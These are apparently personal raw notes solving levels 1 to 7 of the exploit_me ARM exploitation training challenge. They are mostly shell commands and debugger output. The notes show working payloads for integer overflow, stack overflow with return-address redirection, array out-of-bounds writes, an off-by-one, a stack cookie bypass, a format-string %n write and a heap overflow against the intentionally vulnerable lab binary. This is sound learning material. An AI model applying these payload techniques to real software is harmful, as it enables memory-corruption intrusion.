#+TITLE: Exploit_me
#+OPTIONS: num:0 toc:nil html-postamble:nil
#+PROPERTY: header-args :tangle yes :exports both :eval no-export :results output
 
* Introduction

 A colleague told me about [[https://github.com/bkerler/exploit_me][exploit_me]] to learn more about ARM exploitation. 

 So here are my raw notes. I've not made an effort to go into much detail, so they will most likley only be useful to me.

* Level1

 No idea what I'm doing, but I ended up solving it

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64
usage: ./exploit64 <level_password> <arg1> <arg2>
Level 1 Password="hello"
pi@raspberry64:~/exploit_me/bin $ ./exploit64 hello
usage: ./exploit64 hello <value>
pi@raspberry64:~/exploit_me/bin $ ./exploit64 hello a
Value less or equal 0 is not allowed.
pi@raspberry64:~/exploit_me/bin $ ./exploit64 hello 0
Value less or equal 0 is not allowed.
pi@raspberry64:~/exploit_me/bin $ ./exploit64 hello -1
Value 65535 defined.
pi@raspberry64:~/exploit_me/bin $ ./exploit64 hello 65535
Value 65535 defined.
pi@raspberry64:~/exploit_me/bin $ ./exploit64 hello 65536
Level 2 Password: "help"
#+END_EXAMPLE

* Level2

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 help
usage: ./exploit64 help <username> <password>
pi@raspberry64:~/exploit_me/bin $ ./exploit64 help test test
Login failed
#+END_EXAMPLE

#+BEGIN_EXAMPLE 
pwndbg> run help aaaaaaaaaaaaaaaa aaaaaaaaaaaaa
Starting program: /home/pi/exploit_me/bin/exploit64 help aaaaaaaaaaaaaaaa aaaaaaaaaaaaa
Login failed

Program received signal SIGSEGV, Segmentation fault.

pwndbg> run help aaaaaaaaaaaaaaaa admin
Starting program: /home/pi/exploit_me/bin/exploit64 help aaaaaaaaaaaaaaaa admin
Login failed

Program received signal SIGSEGV, Segmentation fault.
#+END_EXAMPLE

Thats 16 a's for the username. Lets get the address for =level3password()=

#+BEGIN_EXAMPLE 
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400280  _init
[..snip..]
0x00000000004011f0  level3password()
#+END_EXAMPLE

Then its just enough padding and the address of the function

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 help $(python -c "import sys;sys.stdout.buffer.write(b'A'*16+b'\xf0\x11\x40\x00\x00\x00\x00\x00\x00')") password
-bash: warning: command substitution: ignored null byte in input
Login failed
Level 3 Password: "Velvet"
#+END_EXAMPLE

* Level3

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 Velvet
usage: ./exploit64 Velvet <arraypos> <value>
pi@raspberry64:~/exploit_me/bin $ ./exploit64 Velvet abc abc
filling array position 0 with 0
#+END_EXAMPLE

Hmmmm not overly sure what to do here. The hint says;

"Hint: You have a maximum of 32 slots to store content."

So we are working with intergers. Lets get the pointer to =level4password()=

#+BEGIN_EXAMPLE 
pwndbg> info functions
All defined functions:

Non-debugging symbols:
[..snip..]
0x0000000000401340  level4password()
#+END_EXAMPLE

So now just overflow the array and then point to the function.

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 Velvet 34 $(python -c 'print("%d" % 0x0000000000401340)')
Level 4 Password: "mysecret"
Level 4 Password: "mysecret"
Level 4 Password: "mysecret"
Level 4 Password: "mysecret"
#+END_EXAMPLE

* Level4

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mysecret
usage: ./exploit64 mysecret <magic>

pi@raspberry64:~/exploit_me/bin $ ./exploit64 mysecret magic
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mysecret aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
#+END_EXAMPLE

The challenge is called off by one, and the hint mentioned null bytes.

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mysecret $(python -c "print('A'*10000+'\x00')")
-bash: warning: command substitution: ignored null byte in input
Length higher 256 not allowed !
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mysecret $(python -c "print('A'*256+'\x00')")
-bash: warning: command substitution: ignored null byte in input
Level 5 Password: "freedom"
#+END_EXAMPLE

* Level5

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom
usage: ./exploit64 freedom <magic>

pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom a
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaaaaaaaaaaaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Running normally
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Error: Stack corrupted !
#+END_EXAMPLE

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ gdb -q ./exploit64

pwndbg> info functions
All defined functions:
[..snip..]
0x0000000000401108  goodPassword()
0x0000000000401174  format_string(char*)
0x00000000004011f0  level3password()
0x0000000000401218  stack_cookie(char*)
0x00000000004012b8  level5password()
[..snip..]
b *0x0000000000401218
r freedom aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
#+END_EXAMPLE

eventually i saw something like this

#+BEGIN_EXAMPLE 
pwndbg> 
0x000000000040122c in stack_cookie(char*) ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
*X0   0x4ae10c (secret) ◂— 0x4031a000001337
 X1   0x0

[..snip..]
#+END_EXAMPLE

Is it that simple ?

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 freedom $(python -c "print('a'*64+'\x01\x00\x00\x00'+'\x37\x13\x00\x00')")
-bash: warning: command substitution: ignored null byte in input
Running normally
Level 6 Password: "happyness"
#+END_EXAMPLE

So fill up the buffer with 64 a's then add an argument of 1, then pass in the secrete stack cookie value.

* Level6

Hint: r should return Y instead of N. But sometimes codes don't want you to reach a simple 'Y'.  But maybe a print function is buggy ?

Oh hello

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ ./exploit64 happyness
Enter your password:%1x%1x%1x
Password=00236c9000

r=N
No Level Password for you today.
#+END_EXAMPLE

Bit of playing around lead to this, basically =%16x= is interpreted wrong, and we can leak memory addresses. Typically that'll be it, but we need to make ~r=Y~, ~%201c~ is the value to write to get the char 'Y'.

#+BEGIN_EXAMPLE 
pi@raspberry64:~/exploit_me/bin $ python -c "print('%16x'*9+'%201c%n')" | ./exploit64 happyness
Enter your password:Password=               0               0        2ccb6000        fbad2887               0        c9f69428        ffffffff        c9f69ba0          401190                                                                                                                                                                                                        ?

r=Y
Level 7 Password: "mypony"
#+END_EXAMPLE

* Level7

Hint: Success will be for those to change the magic to 0x6763

Yeah, i jut bruteforced it 

#+BEGIN_EXAMPLE 
$ ./exploit64 mypony $(python -c 'print("A"*10 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*20 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*30 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*40 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*50 + "\x63\x67")')
Heap magic number: 0x67634141
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*41 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*42 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*43 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*44 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*45 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*46 + "\x63\x67")')
Heap magic number: 0x0
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*47 + "\x63\x67")')
Heap magic number: 0x67
pi@raspberry64:~/exploit_me/bin $ ./exploit64 mypony $(python -c 'print("A"*48 + "\x63\x67")')
Heap magic number: 0x6763
Level 8 Password: "Exploiter"
#+END_EXAMPLE